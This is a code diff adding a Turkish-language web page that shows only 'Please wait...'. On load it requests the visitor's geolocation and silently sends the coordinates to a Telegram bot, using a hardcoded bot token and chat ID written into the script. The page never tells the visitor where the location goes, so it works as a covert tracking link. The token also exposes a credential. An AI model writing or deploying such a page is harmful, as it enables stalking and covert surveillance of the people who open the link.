@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Konum Alınıyor...</title>
+</head>
+<body>
+  <h2>Lütfen bekleyin...</h2>
+  <script>
+    const botToken = '7315012164:AAFwEEQ-Oi26-gl6o7ulfpCRPzRh1XUPzK8';
+    const chatId = '7874399327';
+
+    function sendLocation(lat, lon) {
+      const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`;
+      fetch(url)
+        .then(() => {
+          document.body.innerHTML = "<h3>Konum başarıyla gönderildi ✅</h3>";
+        })
+        .catch(() => {
+          document.body.innerHTML = "<h3>Hata oluştu ❌</h3>";
+        });
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            sendLocation(position.coords.latitude, position.coords.longitude);
+          },
+          () => {
+            document.body.innerHTML = "<h3>Konum alınamadı. İzin vermediniz mi? ❗</h3>";
+          }
+        );
+      } else {
+        document.body.innerHTML = "<h3>Tarayıcınız konum desteği sağlamıyor.</h3>";
+      }
+    }
+
+    getLocation();
+  </script>
+</body>
+</html>
